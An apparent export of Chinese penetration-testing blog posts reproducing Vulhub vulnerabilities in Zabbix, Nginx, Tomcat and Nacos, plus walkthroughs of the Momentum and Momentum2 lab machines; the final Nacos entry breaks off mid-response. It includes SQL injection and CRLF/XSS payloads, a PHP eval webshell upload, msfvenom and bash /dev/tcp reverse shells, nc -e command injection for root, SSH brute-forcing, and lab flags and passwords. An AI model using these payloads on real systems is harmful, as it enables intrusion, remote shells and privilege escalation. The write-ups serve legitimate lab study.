[{"title":"Vulhub|Zabbix集合","url":"/7293a273.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Zabbix SQL注入漏洞（CVE-2016-10134）影响版本 : Zabbix 2.2.* 3.0.0-3.0.3Path : zabbix/CVE-2016-10134Vul : SQL注入  \n\nBreakthrough访问8080端口，发现能够guest免密码登陆系统。注入点latest.php如下（需登陆系统，获取sid）：//Request\nhttp://192.168.35.131:8080/latest.php?output=ajax&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)&amp;sid=&lt;请求Cookie中zbx_sessionid的末16位>\n\n//Respone\n&lt;div class=\"msg-bad\">&lt;div class=\"msg-details\">&lt;ul>&lt;li>Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (12, 2, 'web.latest.toggle', '1', 2, updatexml(0,concat(0xa,user()),0))] [XPATH syntax error: '&lt;/li>&lt;li>root@192.168.0.4']&lt;/li>&lt;/ul>&lt;/div>&lt;span class=\"overlay-close-btn\" onclick=\"javascript: $(this).closest('.msg-bad').remove();\" title=\"Close\">&lt;/span>&lt;/div>注入点jsrpc.php如下（无需登陆系统）：//Request\nhttp://192.168.35.131:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0)\n\n//Respone\n&lt;ul>&lt;li>Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (12, 2, 'web.item.graph.period', '3600', 2, updatexml(0,concat(0xa,user()),0))] [XPATH syntax error: '&lt;/li>&lt;li>root@192.168.0.4']&lt;/li>&lt;li>Error in query [INSERT INTO profiles (profileid, userid, idx, value_str, type, idx2) VALUES (13, 2, 'web.item.graph.stime', '20220725134554', 3, updatexml(0,concat(0xa,user()),0))] [XPATH syntax error: '&lt;/li>&lt;li>root@192.168.0.4']&lt;/li>&lt;li>Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (14, 2, 'web.item.graph.isnow', '1', 2, updatexml(0,concat(0xa,user()),0))] [XPATH syntax error: '&lt;/li>&lt;li>root@192.168.0.4']&lt;/li>&lt;/ul>\n\n","categories":["渗透测试"],"tags":["Vulhub","Zabbix"]},{"title":"Vulhub|Nginx集合","url":"/5821439b.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Nginx 文件名逻辑漏洞（CVE-2013-4547）影响版本 : Nginx 0.8.41-1.4.3 / 1.5.0-1.5.7Vul : 文件上传Path :nginx/CVE-2013-4547Breakthrough：  \n\n（a）将写有php代码的文件保存为 .jpg格式 – 上传文件 – 访问 /&lt;_name&gt;.jpg – 显示存在文件（b）Nginx会匹配正则\\.php$，若匹配上则进入fastcgi处理 – 访问 /&lt;_name&gt;.jpg.php（希望服务器解析文件中的php代码） – 返回文件不存在（没有解析到）（c）访问 /&lt;_name&gt;.jpg.php – bp拦截，使用00截断（在.php前插入HexCode[00]） – 返回数据为空（还是没有解析到）（d）CVE-2013-4547：Nginx如果发现URI中存在空格[20]就会继续处理URI中的剩余部分，这说明了如果空格和截断符相邻[20][00]，nginx就不会检测到00截断，从而可以正常使用00截断。由于00截断fastcgi实际处理的文件为&lt;_name&gt;.jpg[20]，又因系统会自动将文件后缀末尾存在空格[20]修复为&lt;_name&gt;.jpg。（e）上传写有php代码的 .jpg[20]文件 – 访问 /&lt;_name&gt;.jpg – bp拦截 – 将uri参数修改为 /uploadfiles/&lt;_name&gt;.jpg[20][00].php – 重放，响应200 OK（此时应解析成功上传文件中的php代码） – 可尝试蚁剑连接验证  \n\n2.Nginx 整数溢出/越界读取缓存漏洞（CVE-2017-7529）影响版本 : Nginx 0.5.6-1.13.2Vul : 数据泄漏Path :nginx/CVE-2017-7529Breakthrough：  \n\n\nnginx可以当作一个缓存服务器，将web服务器的内容保存到服务器中， 如果客户端请求的内容已经有缓存了，那么可以直接将缓存内容返回，就不需要再次请求服务器了，可降低应用服务器的负载。  \nCVE-2017-7529：请求中包含range头时，Nginx会根据指定rang1和rang2的位置返回指定长度的内容，若非首次的请求range命中了缓存文件 重复请求读取信息是从缓存中读取的，修改请求中的负数偏移量range的范围，即可定位读取到缓存中的敏感数据（原本并不会返回的）  \n\n（a）重复访问192.168.x.x:8080，curl -i 192.168.x.x:8080 – 返回的响应中X-Proxy-Cache：HIT说明非首次访问（首次是MISS）且Content-Length：612（b）计算range：\n\n\n\nrange\n公式\n计算方法\n\n\n\n\nrange1\nrange1 = ContentLength + 605(↑)\n为了向前读取数据，差值最好保持在605+\n\n\nrange2\nrange2 = 8000000000000000 - range1\n总值0x8000000000000000减去rang1\n\n\n\n（c）故该请求需构造为curl -i http://192.168.x.x:8080/ -r -1217,-7999999999998783 – 这里我手动复现不出来 – 使用靶场环境自带的poc.py能够复现该漏洞  \n\n3.Nginx Insecure-configurationVul : CRLF注入(HRS)、目录穿越、add_header失效Path :nginx/insecure-configurationBreakthrough：\nCRLF注入漏洞（HRS）  \n\n错误的配置文件示例：location / &#123;  \n   return 302 https://$host$uri; //（原本的目的是为了让http的请求跳转到https上）  \n&#125;  Nginx会将$uri进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。（a）payload http://192.168.x.x:8080/%0a%0dSet-Cookie:%20a=1 //注入Set-Cookie头，设置了一个SESSION，造成一个会话固定漏洞（b）payload http://192.168.x.x:8080/%0a%0dX-XSS-Protection:%200%0a%0d%0a%0d&lt;script&gt;alert(299)&lt;/script&gt; //注入X-XSS-Protection:0绕过浏览器Fliter，进行xss注入  \n\n目录穿越  \n\n错误的配置文件示例：location /files &#123;  \n   alias /home/; //（原本的目的是为了让用户访问到/home/目录下的文件）  \n&#125;  Nginx在配置别名（alias）的时候，如果原名/files尾部忘记加/，将造成一个目录穿越漏洞。payload http://192.168.x.x:8081/files../  \n\nadd_header失效  \n\n错误的配置文件示例：add_header Content-Security-Policy \"default-src 'self'\"; // 父块（整站）中add_header设置了相关安全规则   \nadd_header X-Frame-Options DENY;  \nlocation = /test1 &#123;  \n   rewrite ^(.*)$ /xss.html break;  \n&#125;  \nlocation = /test2 &#123;  \n   add_header X-Content-Type-Options nosniff; //但/test2的location中又有add_header设置了X-Content-Type-Options，导致父块add_header的设置被覆盖而失效  \n   rewrite ^(.*)$ /xss.html break;  \n&#125;  Nginx配置文件子块（server、location、if）中的add_header，将会覆盖父块中的add_header添加的HTTP头，造成一些安全隐患。  \n\n","categories":["渗透测试"],"tags":["Vulhub","Nginx"]},{"title":"Vulhub|Tomcat集合","url":"/386f84ef.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Tomcat7+ Weak Password &amp;&amp; Backend Getshell Vulnerability影响版本 : Tomcat8.0Vul : 弱口令、文件上传Path : tomcat/tomcat8Breakthrough：  \n\n（a）tomcat默认口令：\n\n\n\nusername\npassword\n\n\n\n\nadmin\n\n\n\nadmin\nadmin\n\n\ntomcat\ntomcat\n\n\n\n（b）msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.x.x LPORT=444 -f war -o shell.war – 上传生成的.war文件 – 抓包 – 从上传成功的响应中得到上传文件的路径 /shell/&lt;jsp_name&gt;.jsp（c）msf开启监听 – 浏览器访问上传文件路径 – msf这里使用script命令getshell  \n\n2.Tomcat Arbitrary Write-file Vulnerability through PUT Method (CVE-2017-12615)影响版本 : Apache Tomcat 7.0.0-7.0.79（7.0.81修复不完全）Vul : 文件上传Path : tomcat/CVE-2017-12615Breakthrough：    \n\n（a）nikto -h 192.168.x.x -p 8080 扫一下发现网站根目录下可以PUT（b）在根目录下刷新网站 – bp拦截 – 将请求改为PUT，写入jsp木马 – 重放（c）这里请求包里PUT的文件名直接使用 /shell.jsp 不能成功上传，需在文件名后缀添加/、::$DATA、%20或.即可绕过 – 成功上传 – 蚁剑连接  \n\n3.Apache Tomcat AJP Arbitrary File Read / Include Vulnerability（CVE-2020-1938）影响版本 : Apache Tomcat 6 / 7-7.0.100 / 8-8.5.51 / 9-9.0.31 Vul : 文件包含Path : tomcat/CVE-2020-1938Breakthrough：  \n\n这个不知道如何手动复现，直接利用了msf的ajp相关exp。  \n\n","categories":["渗透测试"],"tags":["Vulhub","Tomcat"]},{"title":"Vulnhub|Momentum2","url":"/d105a218.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\n端口：┌──(root㉿kali)-[/]\n└─# nmap -p- -A 192.168.81.135 \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-26 21:01 CDT\nNmap scan report for 192.168.81.135\nHost is up (0.00055s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 02:32:8e:5b:27:a8:ea:f2:fe:11:db:2f:57:f4:11:7e (RSA)\n|   256 74:35:c8:fb:96:c1:9f:a0:dc:73:6c:cd:83:52:bf:b7 (ECDSA)\n|_  256 fc:4a:70:fb:b9:7d:32:89:35:0a:45:3d:d9:8b:c5:95 (ED25519)\n80/tcp open  http    Apache httpd 2.4.38 ((Debian))\n|_http-title: Momentum 2 | Index \n|_http-server-header: Apache/2.4.38 (Debian)\nMAC Address: 00:0C:29:EC:78:03 (VMware)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel目录：┌──(root㉿kali)-[/]\n└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.81.135 -x php,html,txt\n......\n===============================================================\n/index.html           (Status: 200) [Size: 1428]\n/img                  (Status: 301) [Size: 314] [--> http://192.168.81.135/img/]\n/css                  (Status: 301) [Size: 314] [--> http://192.168.81.135/css/]\n/ajax.php             (Status: 200) [Size: 0]                                   \n/manual               (Status: 301) [Size: 317] [--> http://192.168.81.135/manual/]\n/js                   (Status: 301) [Size: 313] [--> http://192.168.81.135/js/]    \n/dashboard.html       (Status: 200) [Size: 513]                                    \n/owls                 (Status: 301) [Size: 315] [--> http://192.168.81.135/owls/]  \n/server-status        (Status: 403) [Size: 279]                                     \n......\n\n2.getshell\n/css 和 /manual 没有发现什么敏感信息，/index.html 是 img 4张图片的展示界面。/js 下存在 main.js 访问得到一个文件上传的函数 ：function uploadFile() &#123;\n\n   var files = document.getElementById(\"file\").files;\n\n   if(files.length > 0 )&#123;\n\n      var formData = new FormData();\n      formData.append(\"file\", files[0]);\n\n      var xhttp = new XMLHttpRequest();\n\n      // Set POST method and ajax file path\n      xhttp.open(\"POST\", \"ajax.php\", true);\n\n      // call on request changes state\n      xhttp.onreadystatechange = function() &#123;\n         if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;\n\n           var response = this.responseText;\n           if(response == 1)&#123;\n              alert(\"Upload successfully.\");\n           &#125;else&#123;\n              alert(\"File not uploaded.\");\n           &#125;\n         &#125;\n      &#125;;\n\n      // Send request with data\n      xhttp.send(formData);\n\n   &#125;else&#123;\n      alert(\"Please select a file\");\n   &#125;\n\n&#125;直接访问 /ajax.php 为空，在目录扫描中也能知道 /ajax.php 的 Size 为0。访问 /dashboard.html，发现是一个能够上传文件的界面，界面提示Upload Your Research File about Owls，上传的文件会在/Owls目录下。扫目录的时候漏了一个ajax.php.bak文件，应该在 gobuster 文件类型上加上一个 php.bak（经测试，这里只加 bak 扫不出来）。访问 /ajax.php.bak ： //The boss told me to add one more Upper Case letter at the end of the cookie //boss曾经曰过：需要在cookie后加上至少1位的大写字母\nif(isset($_COOKIE['admin']) &amp;&amp; $_COOKIE['admin'] == '&amp;G6u@B6uDXMq&amp;Ms')&#123; //如果Cookie参数admin值为&amp;G6u@B6uDXMq&amp;Ms\n    //[+] Add if $_POST['secure'] == 'val1d' //如果参数secure值为val1d\n     $valid_ext = array(\"pdf\",\"php\",\"txt\"); //则允许上传pdf、php和txt类型的文件\n&#125;\nelse&#123;\n\n     $valid_ext = array(\"txt\");\n&#125;\n// Remember success upload returns 1 //上传成功则返回1构造请求报文：POST /ajax.php HTTP/1.1\nHost: 192.168.35.129\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------26669720613696613903927820022\nContent-Length: 371\nOrigin: http://192.168.35.129\nDNT: 1\nConnection: close\nReferer: http://192.168.35.129/dashboard.html\nCookie: admin=&amp;G6u@B6uDXMq&amp;Ms§A§ //增加Cookie参数admin，值为&amp;G6u@B6uDXMq&amp;Ms§A§，其中最后一位设置为payload，进行大写字母遍历\n\n-----------------------------26669720613696613903927820022  //增加POST请求form-data表单数据secure，值为val1d\nContent-Disposition: form-data; name=\"secure\";\n\nval1d\n-----------------------------26669720613696613903927820022\nContent-Disposition: form-data; name=\"file\"; filename=\"cmd.php\"\nContent-Type: application/x-php\n\n&lt;?php eval($_REQUEST[cmd]); ?>\n-----------------------------26669720613696613903927820022--在bp-intruder中找到成功上传文件的末尾 R。蚁剑连接 /owls/cmd.php ，密码cmd，成功getshell，在蚁剑里反弹shell至kali。(www-data:/home) $ bash -c 'bash -i >&amp; /dev/tcp/192.168.35.128/6666 0>&amp;1'看一下有什么好登西：┌──(root㉿kali)-[~]\n└─# nc -lnvp 6666         \nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::6666\nNcat: Listening on 0.0.0.0:6666\nNcat: Connection from 192.168.35.129.\nNcat: Connection from 192.168.35.129:51964.\nbash: cannot set terminal process group (563): Inappropriate ioctl for device\nbash: no job control in this shell\n\nwww-data@momentum2:/home$ ls -l\nls -l\ntotal 8\ndrwxr-xr-x 3 athena athena 4096 May 27  2021 athena\ndrwxr-xr-x 2 root   root   4096 May 27  2021 team-tasks\nwww-data@momentum2:/home$ cd athena\ncd athena\nwww-data@momentum2:/home/athena$ ls -l\nls -l\ntotal 8\n-rw-r--r-- 1 athena athena  37 May 27  2021 password-reminder.txt\n-rw-r--r-- 1 root   root   241 May 27  2021 user.txt\nwww-data@momentum2:/home/athena$ cat user.txt //找到第一个flag\ncat user.txt\n/                         \\\n~ Momentum 2 ~ User Owned ~\n\\                         /\n\n---------------------------------------------------\nFLAG : 4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw\n---------------------------------------------------\nwww-data@momentum2:/home/athena$ cat password-reminder.txt //找到一个密码\ncat password-reminder.txt\npassword : myvulnerableapp[Asterisk]搜索了一下 Asterisk = ‘‘ ，用账号 athena 和密码  myvulnerableapp 尝试登陆：┌──(root㉿kali)-[~]\n└─# ssh 'athena'@'192.168.35.129'                                                  \nathena@192.168.35.129's password: \nLinux momentum2 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu May 27 18:12:57 2021 from 10.0.2.15\n\nathena@momentum2:~$ id\nuid=1000(athena) gid=1000(athena) groups=1000(athena),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)\n\nathena@momentum2:/home/team-tasks$ ls -l\ntotal 8\n-rw-r--r-- 1 root root 402 May 27  2021 cookie-gen.py\n-rw-r--r-- 1 root root   0 May 27  2021 log.txt\n-rw-r--r-- 1 root root 151 May 27  2021 note.txt\n\nathena@momentum2:/home/team-tasks$ cat note.txt //用户 athena 具有文件 cookie-gen.py 的执行权限\nHey, Athena use the cookie-gen.py \nto generate secure cookies for our application \nalso remove the ajax.php.bak before it's too late.\n\n3.提权\ncookie-gen.py 的所属用户是 root ，而 athena 具有执行权限，尝试sudo提权：athena@momentum2:/home/team-tasks$ sudo -l\nMatching Defaults entries for athena on momentum2:\n   env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser athena may run the following commands on momentum2:\n   (root) NOPASSWD: /usr/bin/python3 /home/team-tasks/cookie-gen.py但 athena 不具有 cookie-gen.py 的写权限，无法直接写入反弹shell命令执行，看一下 cookie-gen.py 的内容：athena@momentum2:/home/team-tasks$ cat cookie-gen.py \nimport random\nimport os\nimport subprocess\n\nprint('~ Random Cookie Generation ~')\nprint('[!] for security reasons we keep logs about cookie seeds.')\nchars = '@#$ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh'\n\nseed = input(\"Enter the seed : \") // 传入参数 seed 的值\nrandom.seed = seed\n\ncookie = ''\nfor c in range(20):\n   cookie += random.choice(chars)\n\nprint(cookie)\n\ncmd = \"echo %s >> log.txt\" % seed //将传入参数seed的值赋给cmd 并写入log.txt\nsubprocess.Popen(cmd, shell=True) //执行cmd尝试把反弹shell的命令通过seed传入并执行：athena@momentum2:/home/team-tasks$ python cookie-gen.py \n~ Random Cookie Generation ~\n[!] for security reasons we keep logs about cookie seeds.\nEnter the seed : nc -e /bin/bash 192.168.35.128 6666\nTraceback (most recent call last): //报错，应使用python3\n File \"cookie-gen.py\", line 9, in &lt;module>\n   seed = input(\"Enter the seed : \")\n File \"&lt;string>\", line 1\n   nc -e /bin/bash 192.168.35.128 6666\n                         ^\nSyntaxError: invalid syntaxathena@momentum2:/home/team-tasks$ python3 cookie-gen.py\n~ Random Cookie Generation ~\n[!] for security reasons we keep logs about cookie seeds.\nEnter the seed : ;nc -e /bin/bash 192.168.35.128 6666\nBMhgWfaGIXUOAZd@cIHV\nathena@momentum2:/home/team-tasks$ \n/bin/sh: 1: cannot create log.txt: Permission denied //报错，应sudo python3athena@momentum2:/home/team-tasks$ sudo python3 cookie-gen.py \n[sudo] password for athena: \nSorry, user athena is not allowed to execute '/usr/bin/python3 cookie-gen.py' as root on momentum2. //报错，这里再仔细看看 “sudo -l”athena@momentum2:/home/team-tasks$ sudo -l\nMatching Defaults entries for athena on momentum2:\n   env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser athena may run the following commands on momentum2:\n   (root) NOPASSWD: /usr/bin/python3 /home/team-tasks/cookie-gen.py即使在/home/team-tasks目录下，也需要把sudo python3后执行的文件写完整！！athena@momentum2:/home/team-tasks$ sudo python3 /home/team-tasks/cookie-gen.py \n~ Random Cookie Generation ~\n[!] for security reasons we keep logs about cookie seeds.\nEnter the seed : nc -e /bin/bash 192.168.35.128 6666\nIATMIcRBhFNYQUbNXI#Y发现监听端口没有反应，cat log.txt发现存在输入seed的字符串，再仔细看看cookie-gen.py！！cmd = \"echo %s >> log.txt\" % seed\nsubprocess.Popen(cmd, shell=True)所以，输入{seed}，靶机实际上执行的系统命令是echo &#123;seed&#125; &gt;&gt; log.txt！！这里想办法把输入的{seed}作为一条单独的系统命令执行！在系统命令前加一个;！athena@momentum2:/home/team-tasks$ sudo python3 /home/team-tasks/cookie-gen.py \n~ Random Cookie Generation ~\n[!] for security reasons we keep logs about cookie seeds.\nEnter the seed : ;nc -e /bin/bash 192.168.35.128 7777\nA@gHGCRdA#$YZAFTKNbI成功拿到root的shell：┌──(root㉿kali)-[~]\n└─# nc -lnvp 7777\nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::7777\nNcat: Listening on 0.0.0.0:7777\nNcat: Connection from 192.168.35.129.\nNcat: Connection from 192.168.35.129:46764.\nid\nuid=0(root) gid=0(root) groups=0(root)\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nroot@momentum2:~# cat root.txt\ncat root.txt\n//                    \\\\\n&#125;  Rooted - Momentum 2 &#123;\n\\\\                    //\n\n---------------------------------------------------\nFLAG : 4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG\n---------------------------------------------------\n\n\nby Alienum with &lt;3\n\n","categories":["渗透测试"],"tags":["Vulnhub","代码审计"]},{"title":"Vulnhub|Momentum","url":"/b1af99b0.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\n端口：┌──(root㉿kali)-[~]\n└─# nmap -A -p- 192.168.81.134     \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-25 02:27 CDT\nNmap scan report for 192.168.81.134\nHost is up (0.00051s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 5c:8e:2c:cc:c1:b0:3e:7c:0e:22:34:d8:60:31:4e:62 (RSA)\n|   256 81:fd:c6:4c:5a:50:0a:27:ea:83:38:64:b9:8b:bd:c1 (ECDSA)\n|_  256 c1:8f:87:c1:52:09:27:60:5f:2e:2d:e0:08:03:72:c8 (ED25519)\n80/tcp open  http    Apache httpd 2.4.38 ((Debian))\n|_http-title: Momentum | Index \n|_http-server-header: Apache/2.4.38 (Debian)\nMAC Address: 00:0C:29:3B:6D:A4 (VMware)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel目录：┌──(root㉿kali)-[~]\n└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.81.134 -x php,html,txt\n......\n===============================================================\n2022/05/25 02:30:08 Starting gobuster in directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 2001]\n/img                  (Status: 301) [Size: 314] [--> http://192.168.81.134/img/]\n/css                  (Status: 301) [Size: 314] [--> http://192.168.81.134/css/]\n/manual               (Status: 301) [Size: 317] [--> http://192.168.81.134/manual/]\n/js                   (Status: 301) [Size: 313] [--> http://192.168.81.134/js/]    \n......\n\n2.getshell\n/css 和 /manual 没有发现什么敏感信息，/index.html 是 img 4张图片的展示界面。/js 下存在 main.js 访问得到 AES密钥 SecretPassphraseMomentum ：function viewDetails(str) &#123;\n\n window.location.href = \"opus-details.php?id=\"+str;\n&#125;\n\n/*\nvar CryptoJS = require(\"crypto-js\");\nvar decrypted = CryptoJS.AES.decrypt(encrypted, \"SecretPassphraseMomentum\");\nconsole.log(decrypted.toString(CryptoJS.enc.Utf8));\n*/回到 index.html 点击图片，url重定向到 opus-details.php?id= +str。使用 /opus-details.php?id=&lt;img src=1 onerror=alert(document.cookie)&gt; 获取 Cookie:U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt 。将得到的 Cookie 作为密文，与 AES密钥 进行AES解密，得到字符串 auxerre-alienum##  。80端口没有找可以登录的入口，故将解密得到的字符串拆解为用户名和密码字典：┌──(root㉿kali)-[~/Desktop]\n└─# cat db.txt       \nauxerre-alienum##\nauxerre-alienum\nauxerre-\nauxerre\n-alienum##\nalienum##\nalienum使用 nmap 进行ssh爆破：┌──(root㉿kali)-[~/Desktop]\n└─# nmap -p 22 --script ssh-brute --script-args userdb=db.txt,passdb=db.txt 192.168.81.134\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-25 02:20 CDT\nNSE: [ssh-brute] Trying username/password pair: auxerre-alienum##:auxerre-alienum##\n......\nPORT   STATE SERVICE\n22/tcp open  ssh\n| ssh-brute: \n|   Accounts: \n|     auxerre:auxerre-alienum## - Valid credentials\n|_  Statistics: Performed 43 guesses in 13 seconds, average tps: 3.3\nMAC Address: 00:0C:29:3B:6D:A4 (VMware)得到ssh账号密码 auxerre:auxerre-alienum##，成功ssh登录，并在当前用户目录下找到flag：┌──(root㉿kali)-[~/Desktop]\n└─# ssh 'auxerre'@'192.168.81.134'\n......\nauxerre@Momentum:~$ id\nuid=1000(auxerre) gid=1000(auxerre) groups=1000(auxerre),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)\nauxerre@Momentum:~$ pwd\n/home/auxerre\nauxerre@Momentum:~$ ls -l\ntotal 4\n-rwx------ 1 auxerre auxerre 146 Apr 22  2021 user.txt\nauxerre@Momentum:~$ cat user.txt\n[ Momentum - User Owned ]\n---------------------------------------\nflag : 84157165c30ad34d18945b647ec7f647\n---------------------------------------\n\n3.提权\n查看系统用户表，看到存在用户 redis ：auxerre@Momentum:/$ cat /etc/passwd\n......\nroot:x:0:0:root:/root:/bin/bash\nauxerre:x:1000:1000:auxerre,,,:/home/auxerre:/bin/bash\nredis:x:107:115::/var/lib/redis:/usr/sbin/nologin无法使用sudo提权，不具有/etc/passwd文件的写权限，cat crontab没有可利用的定时任务。查看系统当前启用端口 ss -tunlp(这里尝试用netstat，系统提示没有这个命令)：auxerre@Momentum:/$ ss -tunlp\nNetid        State         Recv-Q        Send-Q               Local Address:Port               Peer Address:Port       \nudp          UNCONN        0             0                          0.0.0.0:68                      0.0.0.0:*          \ntcp          LISTEN        0             128                        0.0.0.0:22                      0.0.0.0:*          \ntcp          LISTEN        0             128                      127.0.0.1:6379                    0.0.0.0:*          \ntcp          LISTEN        0             128                           [::]:22                         [::]:*          \ntcp          LISTEN        0             128                          [::1]:6379                       [::]:*          \ntcp          LISTEN        0             128                              *:80                            *:*    发现系统当前启用了 6379 端口，查了一下是redis数据库的默认端口，结合之前发现的用户redis，这里猜测系统正在运行redis数据库，AUX查看当前系统进程确认：auxerre@Momentum:/$ ps aux | grep 127.0.0.1\nredis      540  0.1  0.4  51672  9568 ?        Ssl  03:20   0:06 /usr/bin/redis-server 127.0.0.1:6379\nauxerre    917  0.0  0.0   6208   824 pts/0    S+   04:23   0:00 grep 127.0.0.1（redis是非关系型数据库，数据是以键-值对的形式进行存储，没有传统的表）尝试本地登录redis，登录成功，查看所有的key，发现存在一个名称为rootpass的key，查看该key的值：auxerre@Momentum:/$  redis-cli //本地登录redis\n127.0.0.1:6379> keys * //查看所有key\n1) \"rootpass\"\n127.0.0.1:6379> get rootpass //查看rootpass的值\n\"m0mentum-al1enum##\"猜测rootpass的值为root的密码，直接在shell中su切换为root试试：auxerre@Momentum:/$ su -\nPassword: \nroot@Momentum:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@Momentum:~# pwd\n/root\nroot@Momentum:~# ls -a\n.  ..  .bash_history  .bashrc  .local  .profile  root.txt\nroot@Momentum:~# cat root.txt\n[ Momentum - Rooted ]\n---------------------------------------\nFlag : 658ff660fdac0b079ea78238e5996e40\n---------------------------------------\nby alienum with &lt;3提权成功，并且找到flag。\n\n4.其他\n如果系统没有给账户auxerre本地登录redis的权限，则考虑进行SSH端口转发┌──(root㉿kali)-[/] //本机7777端口映射到靶机6379\n└─# ssh -N -f -L 7777:127.0.0.1:6379 'auxerre'@'192.168.81.134'\nauxerre@192.168.81.134's password: \n                                                                                                                           \n┌──(root㉿kali)-[/] //本机的7777端口确认启用\n└─# netstat -tulpn            \nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.1:36271         0.0.0.0:*               LISTEN      34959/containerd    \ntcp        0      0 127.0.0.1:7777          0.0.0.0:*               LISTEN      122894/ssh          \ntcp6       0      0 ::1:7777                :::*                    LISTEN      122894/ssh          \nudp        0      0 0.0.0.0:68              0.0.0.0:*                           3513/dhclient \n\n┌──(root㉿kali)-[/] //通过本机的7777端口登录靶机的redis数据库\n└─# redis-cli -h 127.0.0.1 -p 7777\n127.0.0.1:7777> keys *\n1) \"rootpass\"\n127.0.0.1:7777> get rootpass\n\"m0mentum-al1enum##\"\n\n","categories":["渗透测试"],"tags":["Vulnhub","SSH爆破","AES","XSS","redis"]},{"title":"Vulhub|Nacos集合","url":"/36be6aa4.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Nacos Authentication Bypass(CVE-2021-29441)影响版本 : &lt;= Nacos 2.0.0-ALPHA.1 / &lt; Nacos 1.4.1 Vul : 认证绕过Path : nacos/CVE-2021-29441Breakthrough：  \n\nnacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。构造请求（读取 /auth/users 内容）：GET /nacos/v1/auth/users?pageNo=1&amp;pageSize=9 HTTP/1.1\nHost: 192.168.81.132:8848\nUser-Agent: Nacos-Server\nAccept: application/json, text/plain, */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\naccessToken: \nDNT: 1\nConnection: close\nReferer: http://192.168.81.132:8848/nacos/成功响应系统 /auth/users 下的内容：HTTP/1.1 200 \nContent-Type: application/json;charset=UTF-8\nDate: Mon, 16 May 2022 07:33:32 GMT\nConnection: close\nContent-Length: 